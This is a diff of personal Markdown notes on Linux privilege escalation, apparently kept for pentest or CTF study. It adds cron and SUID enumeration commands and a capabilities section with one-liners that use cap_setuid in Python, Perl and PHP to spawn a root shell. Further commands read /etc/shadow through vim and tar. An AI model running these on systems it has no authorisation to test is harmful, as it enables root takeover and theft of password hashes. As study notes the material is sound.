@@ -23,8 +23,9 @@ https://github.com/lucyoa/kernel-exploits
 
 >Linux privilege escalation auditing tool
 ```sh
+linpeas.sh
+
 ./Linux_Exploit_Suggester.pl -k 3.0.0
-./linpeas
 ```
 
 
@@ -59,6 +60,22 @@ MIN HOUR DOM MON DOW #minute , hour , day of the month , month , day of the week
 
 example: 
 * * * * echo "hello" > /tmp/test  #this will create a file and print hello every minute 
+  
+  
+# System crontabs
+
+cat /etc/crontab
+
+ls  /etc/cron*
+/etc/cron.d/
+/etc/cron.daily/
+/etc/cron.hourly/
+/etc/cron.weekly/
+/etc/cron.monthly/
+
+# User crontabs
+ls -la /var/spool/cron/
+ls -la /var/spool/cron/crontabs/
 ```
 
 # Commands
@@ -69,19 +86,16 @@ find / -iname local.txt -type f 2>/dev/null
 
 #Takes input from standard input  Converts that input into arguments** for another command
 find . -name "*.tmp" | xargs rm  
-```
 
-
-
-```sh
 #decompress file
 tar -xvzf community_images.tar.gz
-```
 
-
-```sh
 #shows running processes 
 ps aux
+
+#whomai
+id
+uname -a
 ```
 
 **suid**
@@ -90,3 +104,50 @@ find / -perm -u=s 2>/dev/null
 
 find / -perm -g=s -type f 2>/dev/null
 ```
+
+
+**Capabilities**
+
+Capabilities work by breaking the actions normally reserved for root down into smaller portions
+
+```
+getcap -r / 2>/dev/null
+```
+
+
+![[Pasted image 20250930153620.png]]
+
+
+```sh
+# If you find any binary with cap_setuid:
+/usr/bin/python3 = cap_setuid+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/php = cap_setuid+ep
+
+# Exploit with Python:
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Exploit with Perl:
+/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+# Exploit with PHP:
+/usr/bin/php -r "posix_setuid(0); system('/bin/bash');"
+
+# Allows reading any file on system
+/usr/bin/vim = cap_dac_read_search+ep
+
+# Exploit - read shadow file:
+vim /etc/shadow
+
+
+# Output: /bin/tar = cap_dac_read_search+ep
+# Read any file, even without permissions:
+tar -cvf shadow.tar /etc/shadow
+tar -xvf shadow.tar
+cat etc/shadow
+```
+
+
+### References
+
+https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/escalation/linux-privilege-escalation.md
